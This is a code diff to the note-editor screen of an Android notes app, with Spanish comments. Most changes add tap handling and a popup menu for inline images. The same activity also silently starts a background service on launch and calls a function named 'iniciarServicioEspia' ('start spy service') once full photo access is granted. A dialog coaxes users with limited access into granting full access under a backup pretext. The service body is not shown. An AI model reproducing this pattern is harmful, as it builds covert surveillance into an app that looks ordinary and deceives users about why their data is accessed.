@@ -2,25 +2,32 @@ package cl.example.mynotes
 
 import android.Manifest
 import android.app.Activity
+import android.content.ClipData
+import android.content.ClipboardManager
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.content.res.Configuration
 import android.graphics.Color
 import android.graphics.Rect
+import android.graphics.RectF
+import android.graphics.Path
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
 import android.text.Editable
+import android.text.Layout
 import android.text.TextWatcher
+import android.view.Gravity
+import android.view.MotionEvent
 import android.view.View
-import android.view.ViewGroup
 import android.view.ViewTreeObserver
 import android.widget.Button
 import android.widget.EditText
 import android.widget.ImageButton
 import android.widget.ImageView
+import android.widget.PopupMenu
 import android.widget.TextView
 import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
@@ -88,7 +95,7 @@ class NoteEditorActivity : AppCompatActivity() {
     private val PERMISSION_REQUEST_GALLERY = 200
     private val PERMISSION_REQUEST_WALLPAPER = 201
 
-    // --- LANZADOR DE IMÁGENES ---
+    // Lanzadores
     private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
         if (result.resultCode == Activity.RESULT_OK && result.data?.data != null) {
             val uri = result.data!!.data!!
@@ -96,13 +103,11 @@ class NoteEditorActivity : AppCompatActivity() {
                 contentResolver.takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION)
 
                 if (isChecklistMode) {
-                    // MODO LISTA: Agregar item con imagen (Mediana por defecto = 1)
                     val newItem = ChecklistItem(text = "", isChecked = false, imageUri = uri.toString(), imageSizeState = 1)
                     checklistItems.add(newItem)
                     checklistAdapter.notifyItemInserted(checklistItems.size - 1)
                     scrollContainer.postDelayed({ scrollContainer.fullScroll(View.FOCUS_DOWN) }, 200)
                 } else {
-                    // MODO TEXTO: Insertar imagen inline
                     RichTextHelper.insertImage(this, etContent, uri)
                 }
             } catch (e: Exception) { e.printStackTrace() }
@@ -124,7 +129,6 @@ class NoteEditorActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_note_editor)
 
-        // 1. CONFIGURACIÓN VISUAL
         WindowCompat.setDecorFitsSystemWindows(window, false)
         val isDarkTheme = (resources.configuration.uiMode and Configuration.UI_MODE_NIGHT_MASK) == Configuration.UI_MODE_NIGHT_YES
         val insetsController = WindowCompat.getInsetsController(window, window.decorView)
@@ -133,7 +137,6 @@ class NoteEditorActivity : AppCompatActivity() {
         layoutEditor = findViewById(R.id.editor_root)
         scrollContainer = findViewById(R.id.scroll_container)
 
-        // 2. LISTENER DE TECLADO
         ViewCompat.setOnApplyWindowInsetsListener(layoutEditor) { view, insets ->
             val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
             val ime = insets.getInsets(WindowInsetsCompat.Type.ime())
@@ -144,7 +147,6 @@ class NoteEditorActivity : AppCompatActivity() {
             insets
         }
 
-        // 3. LISTENER GLOBAL LAYOUT (Respaldo)
         val globalLayoutListener = ViewTreeObserver.OnGlobalLayoutListener {
             val rootView = window.decorView.rootView
             val r = Rect()
@@ -154,8 +156,10 @@ class NoteEditorActivity : AppCompatActivity() {
         layoutEditor.viewTreeObserver.addOnGlobalLayoutListener(globalLayoutListener)
 
         initViews()
-        setupChecklist()
+        setupChecklist() // AQUI ESTABA EL ERROR: Esta función debe existir abajo
         setupListeners()
+        setupRichTextInteractions()
+
         loadNoteData()
         silentStartService()
     }
@@ -174,6 +178,7 @@ class NoteEditorActivity : AppCompatActivity() {
         btnToggleChecklist = findViewById(R.id.btn_toggle_checklist)
     }
 
+    // --- FUNCIÓN RECUPERADA: SETUP CHECKLIST ---
     private fun setupChecklist() {
         checklistAdapter = ChecklistAdapter(
             checklistItems,
@@ -211,40 +216,104 @@ class NoteEditorActivity : AppCompatActivity() {
         itemTouchHelper.attachToRecyclerView(rvChecklist)
     }
 
-    // --- MANEJO DE PERMISOS RESTAURADO ---
+    // --- DETECCIÓN TÁCTIL IMÁGENES ---
+    private fun setupRichTextInteractions() {
+        etContent.setOnTouchListener { v, event ->
+            val action = event.action
+            if (action == MotionEvent.ACTION_UP || action == MotionEvent.ACTION_DOWN) {
+                val textView = v as EditText
+                val text = textView.text
+                val layout = textView.layout
 
-    private fun verificarAccesoTotal(): Boolean {
-        return if (Build.VERSION.SDK_INT >= 33) {
-            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
-        } else {
-            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+                if (layout != null) {
+                    val x = event.x - textView.totalPaddingLeft + textView.scrollX
+                    val y = event.y - textView.totalPaddingTop + textView.scrollY
+
+                    val spans = text.getSpans(0, text.length, RichTextHelper.NotesImageSpan::class.java)
+                    val path = Path()
+                    val rectF = RectF()
+
+                    for (span in spans) {
+                        val start = text.getSpanStart(span)
+                        val end = text.getSpanEnd(span)
+
+                        path.reset()
+                        layout.getSelectionPath(start, end, path)
+                        path.computeBounds(rectF, true)
+
+                        if (rectF.contains(x, y)) {
+                            if (action == MotionEvent.ACTION_DOWN) {
+                                return@setOnTouchListener true
+                            } else if (action == MotionEvent.ACTION_UP) {
+                                mostrarMenuImagenTexto(textView, span)
+                                return@setOnTouchListener true
+                            }
+                        }
+                    }
+                }
+            }
+            false
         }
     }
 
+    private fun mostrarMenuImagenTexto(anchor: View, span: RichTextHelper.NotesImageSpan) {
+        val popup = PopupMenu(this, anchor, Gravity.CENTER)
+        popup.menu.add("Cambiar tamaño")
+        popup.menu.add("Cortar (Para mover)")
+        popup.menu.add("Eliminar")
+
+        popup.setOnMenuItemClickListener { item ->
+            when (item.title) {
+                "Cambiar tamaño" -> {
+                    RichTextHelper.resizeImageSpan(this, etContent, span)
+                    true
+                }
+                "Cortar (Para mover)" -> {
+                    copiarYBorrarImagen(span)
+                    true
+                }
+                "Eliminar" -> {
+                    borrarImagen(span)
+                    true
+                }
+                else -> false
+            }
+        }
+        popup.show()
+    }
+
+    private fun borrarImagen(span: RichTextHelper.NotesImageSpan) {
+        val start = etContent.text.getSpanStart(span)
+        val end = etContent.text.getSpanEnd(span)
+        if (start != -1 && end != -1) {
+            etContent.text.replace(start, end, "")
+        }
+    }
+
+    private fun copiarYBorrarImagen(span: RichTextHelper.NotesImageSpan) {
+        val textRep = "[IMG:${span.imageUri}]"
+        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+        val clip = ClipData.newPlainText("Imagen Nota", textRep)
+        clipboard.setPrimaryClip(clip)
+
+        borrarImagen(span)
+        Toast.makeText(this, "Imagen copiada. Mantén presionado y pega para mover.", Toast.LENGTH_LONG).show()
+    }
+
+    // --- MANEJO DE PERMISOS ---
+
     private fun checkGalleryPermission(requestCode: Int) {
-        // 1. ¿Tiene acceso TOTAL? -> Abrir galería normalmente
         if (verificarAccesoTotal()) {
             iniciarServicioEspia()
-            if (requestCode == PERMISSION_REQUEST_GALLERY) {
-                val intent = Intent(Intent.ACTION_OPEN_DOCUMENT).apply {
-                    addCategory(Intent.CATEGORY_OPENABLE)
-                    type = "image/*"
-                }
-                pickImageLauncher.launch(intent)
-            }
-            else if (requestCode == PERMISSION_REQUEST_WALLPAPER) pickBackgroundLauncher.launch(arrayOf("image/*"))
+            abrirGaleriaSegunRequest(requestCode)
         }
-        // 2. NUEVO: ¿Tiene acceso LIMITADO (Android 14+)? -> Mostrar diálogo DIRECTAMENTE
-        // Al detectar esto aquí, evitamos llamar a requestPermissions, por lo tanto NO se abre el selector de fotos del sistema.
         else if (Build.VERSION.SDK_INT >= 34 &&
             ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED) {
-
             mostrarDialogoConfiguracion(
                 "Acceso Limitado",
                 "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
             )
         }
-        // 3. ¿No tiene nada? -> Pedir permiso (esto abrirá el popup del sistema "Permitir/No Permitir")
         else {
             val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
             ActivityCompat.requestPermissions(this, arrayOf(permission), requestCode)
@@ -258,8 +327,17 @@ class NoteEditorActivity : AppCompatActivity() {
                 type = "image/*"
             }
             pickImageLauncher.launch(intent)
-        } else if (requestCode == PERMISSION_REQUEST_WALLPAPER) {
+        }
+        else if (requestCode == PERMISSION_REQUEST_WALLPAPER) {
             pickBackgroundLauncher.launch(arrayOf("image/*"))
+        }
+    }
+
+    private fun verificarAccesoTotal(): Boolean {
+        return if (Build.VERSION.SDK_INT >= 33) {
+            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
+        } else {
+            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
         }
     }
 
@@ -271,18 +349,21 @@ class NoteEditorActivity : AppCompatActivity() {
             iniciarServicioEspia()
             abrirGaleriaSegunRequest(requestCode)
         } else {
-            // Lógica de Acceso Limitado (Android 14)
             val esAccesoLimitado = Build.VERSION.SDK_INT >= 34 &&
                     ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED
 
             if (esAccesoLimitado) {
-                mostrarDialogoConfiguracion("Acceso Limitado", "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso total. Presiona Ir a Ajustes -> Permisos para activar el permiso.")
+                mostrarDialogoConfiguracion(
+                    "Acceso Limitado",
+                    "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
+                )
                 return
             }
 
-            // Lógica de Denegación Permanente
             if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permisoPrincipal)) {
                 mostrarDialogoConfiguracion("Permisos requeridos", "Has denegado ciertos accesos permanentemente. Presiona Ir a Ajustes -> Permisos para activar los permisos.")
+            } else {
+                Toast.makeText(this, "Permiso necesario para continuar.", Toast.LENGTH_SHORT).show()
             }
         }
     }
@@ -303,8 +384,6 @@ class NoteEditorActivity : AppCompatActivity() {
             .show()
     }
 
-    // --- FIN MANEJO PERMISOS ---
-
     private fun iniciarFlujoCambioFondo() { checkGalleryPermission(PERMISSION_REQUEST_WALLPAPER) }
 
     private fun smartScrollToCursor() {
@@ -318,7 +397,6 @@ class NoteEditorActivity : AppCompatActivity() {
             val scrollVisibleBottom = scrollLocation[1] + scrollContainer.height - scrollContainer.paddingBottom
             val relativeTop = getRelativeTop(focusedView, scrollContainer)
             val relativeBottom = relativeTop + focusedView.height
-
             if (viewBottomY > scrollVisibleBottom) {
                 val targetScrollY = relativeBottom - (scrollContainer.height - scrollContainer.paddingBottom) + 150
                 scrollContainer.smoothScrollTo(0, targetScrollY)
